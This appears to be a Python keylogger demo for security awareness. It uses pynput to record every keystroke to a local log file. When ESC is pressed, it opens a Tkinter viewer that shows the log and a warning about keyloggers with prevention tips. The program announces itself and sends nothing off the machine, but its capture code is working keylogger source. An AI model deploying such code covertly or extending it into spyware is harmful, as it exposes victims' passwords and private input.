from pynput import keyboard
import datetime
import tkinter as tk
from tkinter import scrolledtext

log_file = "log.txt"
keystrokes = []

def press_key(key):
    time = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    try:
        line = f"{time} - {key.char}"
    except AttributeError:
        line = f"{time} - [{key}]"
    keystrokes.append(line)
    with open(log_file, "a") as f:
        f.write(line + "\n")

def show_awareness_window(parent):
    aw = tk.Toplevel(parent)
    aw.title("⚠️ Security Awareness!")
    window_width, window_height = 500, 350
    screen_width = aw.winfo_screenwidth()
    screen_height = aw.winfo_screenheight()
    x = (screen_width // 2) - (window_width // 2)
    y = (screen_height // 2) - (window_height // 2)
    aw.geometry(f"{window_width}x{window_height}+{x}+{y}")
    aw.configure(bg="#ffffff")

    tk.Label(
        aw, text="⚠️ WARNING ⚠️", font=("Consolas", 22, "bold"),
        fg="#ff2d2d", bg="#ffffff"
    ).pack(pady=(18, 8))

    tk.Label(
        aw,
        text="All your keystrokes were silently recorded!",
        font=("Consolas", 14, "bold"),
        fg="#ff9100", bg="#ffffff"
    ).pack(pady=(0, 12))

    tk.Label(
        aw,
        text=(
            """A keylogger is a malicious tool that secretly records every keystroke you type, putting your passwords and personal information at risk. To prevent keylogger attacks, always keep your software updated, use strong antivirus and anti-keylogger programs, and avoid downloading files from untrusted sources. Enable multi-factor authentication for your accounts and be cautious with suspicious emails or links. Practicing these habits greatly reduces your chances of falling victim to keyloggers."""),
        font=("Consolas", 11),
        fg="#ff2d2d", bg="#ffffff", justify="center", wraplength=440
    ).pack(pady=12)

    tk.Button(
        aw, text="I Understand.", command=aw.destroy,
        font=("Consolas", 12, "bold"), bg="#ff2d2d", fg="#ffffff",
        activebackground="#b71c1c", activeforeground="#fff", bd=0, padx=12, pady=6
    ).pack(pady=18)

    aw.transient(parent)
    aw.grab_set()

def show_log_gui():
    with open(log_file, "r") as f:
        content = f.read()

    window = tk.Tk()
    window.title("Keystroke Log Viewer")
    window.geometry("700x600")
    window.configure(bg="#ffffff")

    tk.Label(
        window, text="KEYSTROKE LOGS", font=("fira code", 18, "bold"),
        bg="#ffffff", fg="#ff2d2d"
    ).pack(pady=12)

    log_box = scrolledtext.ScrolledText(
        window, width=90, height=25, font=("Consolas", 11),
        bg="#ffffff", fg="#19a222", insertbackground="#ff2d2d", borderwidth=0
    )
    log_box.pack(padx=14, pady=12)
    log_box.insert(tk.END, content)
    log_box.config(state="disabled")

    def open_awareness():
        show_awareness_window(window)

    tk.Button(
        window, text="Learn More About Keyloggers", command=open_awareness,
        font=("Consolas", 12, "bold"), bg="#000000", fg="#ffffff",
        activebackground="#b71c1c", activeforeground="#fff", bd=0, padx=10, pady=6
    ).pack(pady=18)

    window.mainloop()

def release_key(key):
    if key == keyboard.Key.esc:
        print("Logging stopped. Opening GUI window...")
        show_log_gui()
        return False

print("Keylogger running... Press ESC to stop and view the log.")

with keyboard.Listener(on_press=press_key, on_release=release_key) as listener:
    listener.join()
